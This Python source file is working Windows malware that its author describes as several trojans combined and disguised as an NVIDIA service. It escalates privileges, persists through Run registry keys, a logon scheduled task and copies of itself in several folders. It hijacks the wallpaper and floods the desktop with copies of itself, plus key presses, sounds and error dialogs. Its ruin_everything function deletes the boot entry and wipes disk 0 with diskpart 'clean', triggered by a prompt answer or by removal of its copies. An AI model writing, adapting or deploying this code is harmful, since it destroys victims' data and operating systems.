import os
import sys
import shutil
import winreg
import time
import ctypes
import pyautogui
import urllib.request
import winsound
import threading
import subprocess
# Heyo if youre reading this, this is a script by scapune. an amalgamation of 3 different trojans i made disguised as a legit program bc why not arm script kiddies
# if anyone finds this script though dm me on discord, my user is scapune
# because i clearly know this wont leave my folder unless compiled so glhf, just in case ill store these here:
# commands to fix it (only usable if it didnt work properly) "bootrec /fixmbr" "bootrec /fixboot" "bootrec /rebuildbcd" in cmd
FILENAME = "NVIDIA Hardware Accelerator.exe"
APP_NAME = "Service Host: NVIDIA"
IMG_URL = "https://img.itch.zone/aW1hZ2UvMTA2MTI2Ni82MDc1NDc0LnBuZw==/original/nIID%2Bn.png"
SOUND_URL = "https://github.com/andyyepes2009-wq/skid-weapon/raw/refs/heads/main/Nyaw-Original-_-FNF-Kapi-Nyaw-Sound-Effect-DJ-D322MW%20(2).wav"
TASK_NAME = "NVIDIA Hardware Accelerator Startup"

def get_source_path():
    return sys.executable if getattr(sys, "frozen", False) else os.path.realpath(__file__)


def create_startup_task():
    if getattr(sys, "frozen", False):
        action = sys.executable
    else:
        action = f'"{sys.executable}" "{os.path.realpath(__file__)}"'

    subprocess.run(
        [
            "schtasks",
            "/Create",
            "/TN",
            TASK_NAME,
            "/TR",
            action,
            "/SC",
            "ONLOGON",
            "/RL",
            "HIGHEST",
            "/F",
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )


def get_persistence_targets():
    home = os.getenv("USERPROFILE")
    dirs = [
        os.getenv("APPDATA"),
        os.getenv("LOCALAPPDATA"),
        os.getenv("TEMP"),
    ]
    if home:
        dirs.append(os.path.join(home, "Documents"))
    return [os.path.join(d, FILENAME) for d in dirs if d]


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def ruin_everything():
    subprocess.run("bcdedit /delete {current} /f", shell=True)
    commands = "select disk 0\nclean\n"
    process = subprocess.Popen(['diskpart'], stdin=subprocess.PIPE, text=True)
    process.communicate(input=commands)

def nuker():
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        return

    
    answer = ctypes.windll.user32.MessageBoxW(0, "Do you appreciate your computer?", "NYAW", 0x24 | 0x40000)

    if answer == 7: 
        ruin_everything()
    else:
        ctypes.windll.user32.MessageBoxW(0, "Kewl. Ur fine for now :3", "Nyaw", 0x40)
    



def set_persistence():
    try:
        app_path = get_source_path()
        target_paths = get_persistence_targets()
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"

        for idx, target_path in enumerate(target_paths):
            if app_path.lower() != target_path.lower():
                shutil.copy2(app_path, target_path)

            reg_name = APP_NAME if idx == 0 else f"{APP_NAME}_{idx}"
            reg_command = f'"{target_path}"'
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.SetValueEx(reg_key, reg_name, 0, winreg.REG_SZ, reg_command)
    except Exception:
        pass


def hijack_wallpaper():
    path = os.path.join(os.getenv('TEMP'), "kapi_bg.png")
    try:
        if not os.path.exists(path):
            urllib.request.urlretrieve(IMG_URL, path)
        ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
    except:
        pass

def desktop_spam():
    try:
        desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
        current_file = get_source_path()
        for i in range(200):
            shutil.copy2(current_file, os.path.join(desktop, f"Nyaw_{i}.exe"))
    except:
        pass

def escape_spam():
    while True:
        pyautogui.press('esc')
        time.sleep(0.01)

def sound_spam():
    path = os.path.join(os.getenv('TEMP'), "kapi_nyaw.wav")
    try:
        if not os.path.exists(path):
            urllib.request.urlretrieve(SOUND_URL, path)
    except:
        pass
    while True:
        winsound.PlaySound(path, winsound.SND_FILENAME | winsound.SND_ASYNC)
        time.sleep(0.5)

def error_spam():
    while True:
        threading.Thread(target=lambda: ctypes.windll.user32.MessageBoxW(0, "Nyaw :3", "Kapi Error", 0x10 | 0x40000), daemon=True).start()
        time.sleep(0.01)

def monitor_persistence():
    target_paths = get_persistence_targets()
    while True:
        missing = [path for path in target_paths if not os.path.exists(path)]
        if missing:
            ruin_everything()
            break
        time.sleep(1)

def main():
    set_persistence()
    nuker()
    hijack_wallpaper()
    desktop_spam()

    threads = [
        threading.Thread(target=set_persistence, daemon=True),
        threading.Thread(target=nuker, daemon=True),
        threading.Thread(target=hijack_wallpaper),
        threading.Thread(target=desktop_spam, daemon=True),
        threading.Thread(target=escape_spam, daemon=True),
        threading.Thread(target=sound_spam, daemon=True),
        threading.Thread(target=error_spam, daemon=True),
        threading.Thread(target=monitor_persistence, daemon=True),
    ]
    
    for t in threads:
        t.start()

    try:
        while True:
            time.sleep(1)
            set_persistence()
    except KeyboardInterrupt:
        sys.exit()

if __name__ == "__main__":
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()

    create_startup_task()

    mutex = ctypes.windll.kernel32.CreateMutexW(None, False, "NVIDIA_Service_Host_Mutex")
    if ctypes.windll.kernel32.GetLastError() != 183:
        main()
